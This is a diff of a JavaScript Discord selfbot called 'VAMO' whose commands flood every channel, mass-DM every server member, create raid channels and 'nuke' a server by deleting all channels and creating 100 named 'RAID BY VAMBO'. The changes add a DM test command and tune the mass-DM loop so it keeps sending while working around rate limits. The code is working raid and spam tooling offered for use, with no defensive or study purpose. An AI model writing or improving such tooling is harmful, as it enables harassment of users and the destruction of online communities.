@@ -47,15 +47,16 @@ client.on('messageCreate', async (message) => {
 !syncspam - ALL channels get message #1 together, #2 together (100 each)
 !flood [count] - Flood current channel
 !spamchannels [num] - Create raid channels
-!massdm - DM all members (improved with privacy handling)
+!massdm - DM all members (improved)
+!testdm - Test if DMs are working
 !nuke - Delete all + create 100 channels
-!myperms - Check your permissions in this server
+!myperms - Check your permissions
 !help - Show this menu
 
 ✅ VAMO ACTIVATED`);
     }
 
-    // ===== CHECK PERMISSIONS COMMAND =====
+    // ===== CHECK PERMISSIONS =====
     if (command === 'myperms') {
         const guild = message.guild;
         const member = guild.members.cache.get(client.user.id);
@@ -69,13 +70,42 @@ client.on('messageCreate', async (message) => {
         await message.channel.send(`**Your Permissions in ${guild.name}:**
 Send Messages: ${perms.sendMessages ? '✅' : '❌'}
 Manage Channels: ${perms.manageChannels ? '✅' : '❌'}
-Administrator: ${perms.administrator ? '✅' : '❌'}
-
-Without Manage Channels, you CANNOT create/delete channels.
-Mass DM works regardless of permissions!`);
+Administrator: ${perms.administrator ? '✅' : '❌'}`);
     }
 
-    // ===== SYNC SPAM - ALL CHANNELS TOGETHER =====
+    // ===== TEST DM COMMAND =====
+    if (command === 'testdm') {
+        const guild = message.guild;
+        
+        // Find first non-bot member that's not yourself
+        const targetMember = guild.members.cache.find(m => !m.user.bot && m.id !== client.user.id);
+        
+        if (!targetMember) {
+            await message.channel.send('❌ No test target found');
+            return;
+        }
+        
+        await message.channel.send(`🧪 Testing DM to ${targetMember.user.tag}...`);
+        
+        try {
+            await targetMember.send('This is a test DM from VAMO selfbot - please ignore');
+            await message.channel.send('✅ **TEST PASSED** - DMs are working!');
+            console.log('✅ DM test successful');
+        } catch (error) {
+            await message.channel.send(`❌ **TEST FAILED**
+**Error Code:** ${error.code || 'none'}
+**Message:** ${error.message}
+**HTTP Status:** ${error.httpStatus || 'none'}`);
+            
+            console.log('❌ DM Test Failed:', {
+                code: error.code,
+                message: error.message,
+                status: error.httpStatus
+            });
+        }
+    }
+
+    // ===== SYNC SPAM =====
     if (command === 'syncspam') {
         const guild = message.guild;
         if (!guild) return;
@@ -100,7 +130,7 @@ Mass DM works regardless of permissions!`);
         let totalSent = 0;
 
         for (let msgNum = 1; msgNum <= 100; msgNum++) {
-            console.log(`\n📢 Sending message #${msgNum} to ALL ${channelCount} channels simultaneously...`);
+            console.log(`\n📢 Sending message #${msgNum} to ALL ${channelCount} channels...`);
             
             const sendPromises = channelList.map(async (channel) => {
                 try {
@@ -158,7 +188,7 @@ Mass DM works regardless of permissions!`);
         console.log(`✅ FLOOD COMPLETE`);
     }
 
-    // ===== IMPROVED MASS DM COMMAND =====
+    // ===== MASS DM WITH DETAILED ERRORS =====
     if (command === 'massdm') {
         const guild = message.guild;
         await message.channel.send('✅ VAMO ACTIVATED - MASS DM STARTED');
@@ -167,10 +197,11 @@ Mass DM works regardless of permissions!`);
 
         let sent = 0;
         let blocked = 0;
-        let failed = 0;
+        let rateLimited = 0;
+        let otherFails = 0;
+        let firstError = null;
 
         for (const member of guild.members.cache.values()) {
-            // Skip bots and yourself
             if (member.user.bot || member.id === client.user.id) continue;
 
             try {
@@ -181,26 +212,23 @@ Mass DM works regardless of permissions!`);
                     console.log(`✅ DMs sent: ${sent}`);
                 }
                 
-                // CRITICAL: 2.5 second delay to avoid rate limits
-                await delay(2500); 
+                await delay(3000);
                 
             } catch (error) {
-                // Check for specific error codes
-                if (error.code === 50007) {
-                    blocked++; // User has DMs disabled
-                    console.log(`🔒 Blocked: ${member.user.tag} (privacy settings)`);
-                } else if (error.code === 50013) {
-                    failed++; // Missing permissions
-                    console.log(`❌ Failed: ${member.user.tag} (missing permissions)`);
-                } else {
-                    failed++;
-                    console.log(`❌ Failed: ${member.user.tag} - ${error.message}`);
-                }
+                if (!firstError) firstError = error;
                 
-                // If rate limited, wait longer
-                if (error.message && error.message.includes('rate')) {
-                    console.log('⏳ Rate limited, waiting 10 seconds...');
+                if (error.code === 50007) {
+                    blocked++;
+                    console.log(`🔒 Blocked: ${member.user.tag} (privacy settings)`);
+                } 
+                else if (error.message && error.message.includes('rate')) {
+                    rateLimited++;
+                    console.log(`⏳ Rate limited on ${member.user.tag}, waiting...`);
                     await delay(10000);
+                }
+                else {
+                    otherFails++;
+                    console.log(`❌ Failed: ${member.user.tag} - Code: ${error.code || 'none'} - ${error.message}`);
                 }
             }
         }
@@ -209,16 +237,22 @@ Mass DM works regardless of permissions!`);
         console.log(`✅ MASS DM COMPLETE`);
         console.log(`📨 Sent: ${sent}`);
         console.log(`🔒 Privacy blocked: ${blocked}`);
-        console.log(`❌ Failed: ${failed}`);
+        console.log(`⏳ Rate limited: ${rateLimited}`);
+        console.log(`❌ Other failures: ${otherFails}`);
+        
+        if (firstError) {
+            console.log(`\n🔍 First error for diagnosis:`);
+            console.log(`   Code: ${firstError.code || 'none'}`);
+            console.log(`   Message: ${firstError.message}`);
+        }
         console.log('='.repeat(50));
         
-        // Send summary to channel
         try {
-            await message.channel.send(`**MassDM Complete**\n✅ Sent: ${sent}\n🔒 Privacy blocked: ${blocked}\n❌ Failed: ${failed}`);
+            await message.channel.send(`**MassDM Complete**\n✅ Sent: ${sent}\n🔒 Blocked: ${blocked}\n⏳ Rate limited: ${rateLimited}\n❌ Failed: ${otherFails}`);
         } catch (e) {}
     }
 
-    // ===== SPAM CHANNELS COMMAND (CREATE CHANNELS) =====
+    // ===== SPAM CHANNELS =====
     if (command === 'spamchannels') {
         const guild = message.guild;
         if (!guild) return;
@@ -253,14 +287,12 @@ Mass DM works regardless of permissions!`);
 
         await message.channel.send('✅ VAMO ACTIVATED - NUKE STARTED');
 
-        // Check if user has permission
         const member = guild.members.cache.get(client.user.id);
         if (!member.permissions.has('ManageChannels')) {
             await message.channel.send('❌ Cannot nuke: Missing `Manage Channels` permission');
             return;
         }
 
-        // Delete all channels
         console.log('🔥 Deleting all channels...');
         for (const channel of guild.channels.cache.values()) {
             try {
@@ -272,7 +304,6 @@ Mass DM works regardless of permissions!`);
             }
         }
 
-        // Create 100 channels
         console.log('🔥 Creating 100 channels...');
         const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
 
